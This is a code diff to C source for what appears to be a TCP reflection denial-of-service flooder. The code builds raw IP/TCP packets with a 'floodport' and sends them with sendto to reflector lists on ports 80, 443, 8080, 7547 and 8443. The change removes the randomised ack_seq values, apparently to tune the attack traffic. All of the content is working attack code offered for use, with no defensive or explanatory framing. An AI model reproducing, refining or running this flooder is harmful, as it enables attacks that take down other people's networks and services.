@@ -192,7 +192,6 @@ void setup_tcp_header(struct tcphdr *tcph)
 	tcph->dest = htons(sPorts[randnum(0, 4)]);
 	tcph->source = htons(floodport);
 	tcph->ack = 0;
-	tcph->ack_seq = randnum(10000, 99999);
 	tcph->psh = 0;
 	tcph->fin = 0;
 	tcph->rst = 0;
@@ -379,7 +378,7 @@ void *flood(void *par1)
 				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
+
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_80->data, sizeof(list_80->data));
 			}
 			else if (drdossType == 443)
@@ -389,7 +388,7 @@ void *flood(void *par1)
 				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
+
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_443->data, sizeof(list_443->data));
 			}
 			else if (drdossType == 8080)
@@ -399,7 +398,7 @@ void *flood(void *par1)
 				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
+
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8080->data, sizeof(list_8080->data));
 			}
 			else if (drdossType == 7547)
@@ -409,7 +408,7 @@ void *flood(void *par1)
 				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
+
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_7547->data, sizeof(list_7547->data));
 			}
 			else if (drdossType == 8443)
@@ -419,7 +418,7 @@ void *flood(void *par1)
 				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
 				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
-				tcph->ack_seq = randnum(10000, 99999);
+
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8443->data, sizeof(list_8443->data));
 			}
 		}
